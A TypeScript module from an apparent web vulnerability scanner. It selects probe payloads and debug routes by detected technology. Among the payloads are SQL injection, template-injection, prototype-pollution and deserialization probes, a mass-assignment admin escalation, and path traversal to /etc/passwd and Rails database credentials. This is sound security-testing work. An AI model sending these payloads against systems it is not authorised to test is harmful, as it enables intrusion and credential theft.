import logger from "../../utils/logger";

export interface TechPayload {
  vulnClass: string;
  payload: string;
  targetPath?: string;   // specific path to probe for this tech
  description: string;
  confidence: number;
  priority: number;
}

export interface TechProfile {
  detected: string[];    // e.g. ["Rails", "Ruby", "PostgreSQL"]
  payloads: TechPayload[];
  debugRoutes: string[]; // paths to probe for debug/admin exposure
}

class TechPayloadSelector {
  select(technologies: string[]): TechProfile {
    const techs = technologies.map(t => t.toLowerCase());

    const detected: string[] = [];
    const allPayloads: TechPayload[] = [];
    const allDebugRoutes: string[] = [];

    // ── Ruby on Rails ──────────────────────────────────────────────────────────
    if (techs.some(t => t.includes("rails") || t.includes("ruby"))) {
      detected.push(...technologies.filter(t =>
        t.toLowerCase().includes("rails") || t.toLowerCase().includes("ruby")
      ));
      allDebugRoutes.push(
        "/rails/info/properties",
        "/rails/info/routes",
        "/rails/mailers"
      );
      allPayloads.push(
        {
          vulnClass: "mass_assignment",
          payload: '{"user":{"role":"admin"}}',
          description: "Rails strong-parameters bypass — attempt to assign privileged attributes via mass assignment",
          confidence: 0.7,
          priority: 8,
        },
        {
          vulnClass: "ssti",
          payload: "<%= 7*7 %>",
          description: "ERB/Rails SSTI probe — arithmetic expression that evaluates to 49 if templating is unsanitised",
          confidence: 0.65,
          priority: 7,
        },
        {
          vulnClass: "lfi",
          payload: "/../config/database.yml",
          targetPath: "/../config/database.yml",
          description: "Rails path traversal to database credentials file",
          confidence: 0.6,
          priority: 7,
        }
      );
    }

    // ── Django ─────────────────────────────────────────────────────────────────
    if (techs.some(t => t.includes("django"))) {
      detected.push(...technologies.filter(t => t.toLowerCase().includes("django")));
      allDebugRoutes.push("/admin/", "/api/schema/", "/__debug__/");
      allPayloads.push(
        {
          vulnClass: "ssti",
          payload: "{{7*7}}",
          description: "Django/Jinja2 SSTI probe — arithmetic expression that evaluates to 49 if template injection is possible",
          confidence: 0.7,
          priority: 8,
        },
        {
          vulnClass: "sqli",
          payload: "' OR 1=1--",
          description: "Django ORM SQL injection probe on common query parameters",
          confidence: 0.6,
          priority: 7,
        },
        {
          vulnClass: "info_disclosure",
          payload: "/api/settings/",
          targetPath: "/api/settings/",
          description: "Django settings endpoint probe — may expose SECRET_KEY and other sensitive configuration",
          confidence: 0.55,
          priority: 6,
        }
      );
    }

    // ── Laravel / PHP ──────────────────────────────────────────────────────────
    if (techs.some(t => t.includes("laravel") || t.includes("php"))) {
      detected.push(...technologies.filter(t =>
        t.toLowerCase().includes("laravel") || t.toLowerCase().includes("php")
      ));
      allDebugRoutes.push(
        "/_ignition/health-check",
        "/api/documentation",
        "/telescope/api/requests"
      );
      allPayloads.push(
        {
          vulnClass: "rce",
          payload: 'O:8:"stdClass":0:{}',
          description: "PHP object injection probe — serialised stdClass payload to test for unsafe unserialize()",
          confidence: 0.55,
          priority: 8,
        },
        {
          vulnClass: "ssti",
          payload: "{{7*7}}",
          description: "Blade/Twig SSTI probe — arithmetic expression that evaluates to 49 if template injection is possible",
          confidence: 0.6,
          priority: 7,
        },
        {
          vulnClass: "lfi",
          payload: "../../etc/passwd",
          targetPath: "../../etc/passwd",
          description: "PHP path traversal to /etc/passwd via relative path segments",
          confidence: 0.65,
          priority: 8,
        }
      );
    }

    // ── Spring / Java ──────────────────────────────────────────────────────────
    if (techs.some(t => t.includes("spring") || t.includes("java"))) {
      detected.push(...technologies.filter(t =>
        t.toLowerCase().includes("spring") || t.toLowerCase().includes("java")
      ));
      allDebugRoutes.push(
        "/actuator",
        "/actuator/env",
        "/actuator/heapdump",
        "/h2-console",
        "/swagger-ui.html"
      );
      allPayloads.push(
        {
          vulnClass: "ssti",
          payload: "${7*7}",
          description: "Spring Expression Language (SpEL) SSTI probe — evaluates to 49 if expression injection is unsanitised",
          confidence: 0.7,
          priority: 9,
        },
        {
          vulnClass: "ssti",
          payload: "#{7*7}",
          description: "Spring/Thymeleaf expression injection probe — evaluates to 49 if template injection is present",
          confidence: 0.7,
          priority: 9,
        },
        {
          vulnClass: "rce",
          payload: "Content-Type: application/x-java-serialized-object",
          description: "Java deserialization probe — check whether endpoints accept Java serialised object content-type",
          confidence: 0.6,
          priority: 9,
        }
      );
    }

    // ── Express / Node.js ─────────────────────────────────────────────────────
    if (techs.some(t => t.includes("express") || t.includes("node"))) {
      detected.push(...technologies.filter(t =>
        t.toLowerCase().includes("express") || t.toLowerCase().includes("node")
      ));
      allDebugRoutes.push(
        "/__proto__",
        "/package.json",
        "/node_modules/.package-lock.json"
      );
      allPayloads.push(
        {
          vulnClass: "prototype_pollution",
          payload: "__proto__[admin]=true",
          description: "Node.js prototype pollution probe — attempt to set admin flag via __proto__ key injection",
          confidence: 0.7,
          priority: 8,
        },
        {
          vulnClass: "lfi",
          payload: "../../../etc/passwd",
          targetPath: "../../../etc/passwd",
          description: "Node.js/Express path traversal to /etc/passwd via relative path segments",
          confidence: 0.65,
          priority: 7,
        }
      );
    }

    // ── WordPress ─────────────────────────────────────────────────────────────
    if (techs.some(t => t.includes("wordpress") || t.includes("wp"))) {
      detected.push(...technologies.filter(t =>
        t.toLowerCase().includes("wordpress") || t.toLowerCase().includes("wp")
      ));
      allDebugRoutes.push(
        "/wp-json/wp/v2/users",
        "/wp-admin/",
        "/xmlrpc.php"
      );
      allPayloads.push(
        {
          vulnClass: "info_disclosure",
          payload: "/wp-json/wp/v2/users?per_page=100",
          targetPath: "/wp-json/wp/v2/users?per_page=100",
          description: "WordPress REST API user enumeration — lists registered usernames and IDs without authentication",
          confidence: 0.8,
          priority: 7,
        }
      );
    }

    // ── GraphQL (Apollo / Hasura) ──────────────────────────────────────────────
    if (techs.some(t => t.includes("graphql") || t.includes("apollo") || t.includes("hasura"))) {
      detected.push(...technologies.filter(t =>
        t.toLowerCase().includes("graphql") ||
        t.toLowerCase().includes("apollo") ||
        t.toLowerCase().includes("hasura")
      ));
      allPayloads.push(
        {
          vulnClass: "info_disclosure",
          payload: "{__schema{types{name}}}",
          description: "GraphQL introspection probe — enumerates all types in the schema; should be disabled in production",
          confidence: 0.75,
          priority: 7,
        },
        {
          vulnClass: "info_disclosure",
          payload: JSON.stringify(Array.from({ length: 10 }, () => ({ query: "{ __typename }" }))),
          description: "GraphQL batch query attack — tests whether the endpoint allows batched operations that can amplify abuse",
          confidence: 0.6,
          priority: 6,
        },
        {
          vulnClass: "info_disclosure",
          payload: '{"query":"{ __type(name: \\"User\\") { fields { name } } }"}',
          description: "GraphQL field suggestion probe — leverages __type introspection to discover hidden fields via suggestions",
          confidence: 0.6,
          priority: 6,
        }
      );
    }

    // ── No known tech detected ────────────────────────────────────────────────
    if (detected.length === 0) {
      logger.debug("[TechPayloadSelector] No known technology detected", { technologies });
      return { detected: [], payloads: [], debugRoutes: [] };
    }

    // Deduplicate by payload string
    const seenPayloads = new Set<string>();
    const payloads: TechPayload[] = [];
    for (const p of allPayloads) {
      if (!seenPayloads.has(p.payload)) {
        seenPayloads.add(p.payload);
        payloads.push(p);
      }
    }

    // Deduplicate debug routes
    const debugRoutes = [...new Set(allDebugRoutes)];

    // Deduplicate detected tech names
    const uniqueDetected = [...new Set(detected)];

    logger.info("[TechPayloadSelector] Tech profile built", {
      detected: uniqueDetected,
      payloadCount: payloads.length,
      debugRouteCount: debugRoutes.length,
    });

    return { detected: uniqueDetected, payloads, debugRoutes };
  }
}

export const techPayloadSelector = new TechPayloadSelector();
